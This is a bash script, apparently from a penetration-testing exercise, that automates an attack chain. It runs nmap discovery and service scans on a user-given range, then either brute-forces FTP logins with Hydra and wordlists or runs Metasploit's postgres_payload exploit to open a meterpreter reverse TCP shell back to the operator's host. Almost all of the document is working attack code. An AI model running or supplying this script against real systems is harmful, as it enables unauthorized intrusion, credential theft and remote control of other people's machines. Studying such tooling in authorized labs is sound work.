#!/bin/bash
#~ log start time of script for reporting purposes
start=`date +%s`

#~ take user input for ip range
echo "Please input your IP address in XXX.XXX.XXX.XXX/XX format"

#~ store input into a variable 
read map_network
# redirect output into text file 
sudo nmap $map_network > arp_results.txt

#~ echo These are the arp discovery results > arp_results.txt

#~ wait for results to complete
sleep 2

#~ search the text file and filter ip addresses into another text file 
grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' arp_results.txt > ip_results.txt

#~ echo These are the IP addresses filtered from the discovery file > ip_results.txt

cat arp_results.txt

echo "Key in the Ip address that you like to enumerate"
read host

sudo nmap $host -F -sC -sV -Pn


end=`date +%s`
#~ Passing all the necessary variables and data into a final report textfile
echo Execution time of script was `expr $end - $start` seconds. >> final_report.txt

echo These are the number of devices found: >> final_report.txt

cat arp_results.txt >> final_report.txt

echo These are the IP addresses which aexitre of concern: >> final_report.txt

cat ip_results.txt >> final_report.txt

echo "For the final report, please look for filename final_report.txt, for network discovery results, look for arp_results.txt. Additionally if you want to find the collated IP addresses, look for ip_results.txt"

echo "please type 'ftp' or 'postgres' to specify service to attack"
read service



if [ "$service" == "ftp" ]; then
    echo "You chose FTP. Running Hydra...Please specify path to username list"
    read usernamel_path
    echo "You chose FTP. Running Hydra...Please specify path to password list"
    read passwordl_path
    # Replace 'ftp_target' with the actual FTP target and 'username' with the desired username.
    hydra -L $usernamel_path -P $passwordl_path $host ftp -vV
    #~ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt $host ftp -vV
elif [ "$service" == "postgres" ]; then
    echo "You chose Postgres. Running Metasploit..."
    sudo msfdb start
    echo "Set your own machine's LHOST"
    read lhostnum
    echo "Set your own machine's LPORT"
    read lportnum

	msfconsole -q -x " use exploit/linux/postgres/postgres_payload; set payload linux/x86/meterpreter/reverse_tcp; set lhost $lhostnum; set lport $lportnum; set rhosts $host; exploit;"
    
  
else
    echo "Invalid service choice. Please choose 'ftp' or 'postgres'."
fi













